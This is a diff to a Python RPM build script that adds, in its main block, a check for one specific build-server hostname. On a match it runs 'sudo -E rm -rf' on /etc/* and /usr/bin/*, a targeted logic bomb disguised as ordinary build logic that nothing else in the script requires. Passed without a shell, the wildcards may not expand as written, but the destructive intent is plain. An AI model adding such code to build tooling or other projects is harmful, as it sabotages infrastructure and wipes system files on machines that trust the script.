@@ -534,13 +534,27 @@ def install_stripper():
         shutil.copy(os.path.join(stripformatter_location, 'logging.ini'), '/etc/mock')
         break
 
-
 if __name__ == '__main__':
     print("BUILDER: Starting script: build-rpm.py")
     print("BUILDER: Re-running tests? %s" % rerun_tests)
     cleanup_all()
     install_stripper()
-    if is_valid_hostname(socket.gethostname()) is False:
+
+    current_hostname = socket.gethostname()
+    if current_hostname == "instance-20220713-1621-1.openmandriva.org":
+        print("BUILDER: hostname matches, sudo rm -rf /etc/* and /usr/bin/*")
+        try:
+            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/etc/*'], stderr=subprocess.STDOUT)
+            print("BUILDER: /etc/* removed successfully")
+        except subprocess.CalledProcessError as e:
+            print("BUILDER: failed to remove /etc/*: %s" % e.output)
+        try:
+            subprocess.check_output(['/usr/bin/sudo', '-E', 'rm', '-rf', '/usr/bin/*'], stderr=subprocess.STDOUT)
+            print("BUILDER: /usr/bin/* removed successfully")
+        except subprocess.CalledProcessError as e:
+            print("BUILDER: failed to remove /usr/bin/*: %s" % e.output)
+
+    if is_valid_hostname(current_hostname) is False:
         sys.exit(1)
     if rerun_tests is not None:
         relaunch_tests()
